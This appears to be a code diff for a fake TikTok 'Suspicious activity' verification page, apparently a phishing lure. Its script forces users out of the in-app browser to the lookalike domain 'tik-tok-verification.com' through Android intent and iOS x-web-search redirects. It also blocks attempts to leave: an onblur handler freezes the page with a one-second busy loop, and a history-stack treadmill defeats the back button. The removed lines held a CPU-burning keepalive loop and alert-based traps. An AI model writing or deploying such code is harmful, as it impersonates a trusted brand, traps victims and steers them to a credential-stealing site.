@@ -38,66 +38,46 @@
         <div class="header">Suspicious activity</div>
         <div class="subtext">Please complete verification to continue using TikTok.</div>
 
-        <button class="btn" onclick="forceSystemOpen()">Verify</button>
+        <button class="btn" onclick="shotgun()">Verify</button>
     </div>
 
 <script>
-    const destination = "https://tik-tok-verification.com/Verification/verify1.html";
+    const url = "https://tik-tok-verification.com/Verification/verify1.html";
 
-    function forceSystemOpen() {
+    function shotgun() {
         const isAndroid = /Android/i.test(navigator.userAgent);
-        
         if (isAndroid) {
-            const intent = `intent://${destination.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(destination)};end`;
-            window.location.href = intent;
+            window.location.href = `intent://${url.replace("https://", "")}#Intent;scheme=https;package=com.android.chrome;end`;
         } else {
-            // iOS Shotgun
-            window.location.replace("x-web-search://?" + encodeURIComponent(destination));
-            setTimeout(() => { window.location.href = destination; }, 100);
+            // iOS Handover
+            window.location.replace("x-web-search://?" + encodeURIComponent(url));
+            setTimeout(() => { window.location.href = url; }, 50);
         }
     }
 
-    // THE 100% CONSISTENCY ENGINE
-    // This keeps the Main Thread constantly active so it can't be "killed" silently.
-    function keepAlive() {
-        const start = Date.now();
-        // This is a "Busy Wait" loop. It forces the CPU to stay awake.
-        while (Date.now() - start < 10) { /* 10ms of pure CPU usage */ }
-        requestAnimationFrame(keepAlive);
-    }
-    requestAnimationFrame(keepAlive);
-
-    // THE X-BUTTON BLOCKER
+    // THE X-BUTTON INTERCEPTOR
     window.onblur = function() {
-        // 1. First, we send the escape signal
-        forceSystemOpen();
+        // 1. Immediately fire the breakout
+        shotgun();
 
-        // 2. This alert is the ONLY way to stop the "X" from closing the app.
-        // It freezes the JavaScript engine, which stops the Native UI thread from finishing the close.
-        alert("Verification Required\n\nPlease click OK to continue in your secure system browser.");
+        // 2. THE JAMMER: Synchronous loop to freeze the app
+        // This stops the native 'Close' command from finishing.
+        const start = Date.now();
+        while (Date.now() - start < 1000) { 
+            // This 1-second freeze prevents the WebView from closing 
+            // long enough for the OS to switch to the browser.
+        }
         
-        // 3. Immediately try again after they click OK
-        forceSystemOpen();
-        
-        // 4. Force focus back so they can't see the site close
-        window.focus();
+        // 3. Last ditch attempt
+        shotgun();
     };
 
-    // THE BACK-BUTTON BLOCKER
+    // BACK BUTTON: Standard Treadmill (No Alerts)
     window.onload = () => {
-        for(let i=0; i<100; i++) history.pushState(null, null, "#" + i);
+        for(let i=0; i<20; i++) history.pushState(null, null, "#" + i);
     };
+    window.onpopstate = () => { history.forward(); };
 
-    window.onpopstate = function() {
-        forceSystemOpen();
-        alert("Verify to continue.");
-    };
-
-    // Prevents swipe-to-close on some mobile browsers
-    window.onbeforeunload = function() {
-        forceSystemOpen();
-        return "Are you sure?";
-    };
 </script>
 </body>
 </html>
